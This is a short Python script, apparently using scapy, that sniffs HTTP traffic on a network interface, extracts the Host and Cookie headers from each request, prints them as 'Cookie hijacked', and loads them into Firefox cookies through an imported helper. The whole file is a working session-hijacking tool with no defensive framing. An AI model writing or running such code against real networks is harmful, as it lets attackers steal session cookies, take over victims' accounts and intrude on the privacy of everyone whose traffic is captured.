from scapy.all import *
from scapy.layers import http
from utils.browser_cookie import gen_firefox_cookie


def hijack_http_session(packet):
    host = packet["HTTP Request"].Host
    cookie = packet["HTTP Request"].Cookie

    if host is not None and cookie is not None:
        print "Cookie hijacked"

        print host
        print cookie

        gen_firefox_cookie(host, cookie)


def packet_control(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        if packet.haslayer(http.HTTPRequest):
            hijack_http_session(packet)

if __name__ == "__main__":
    sniff(iface="eth0", prn=packet_control)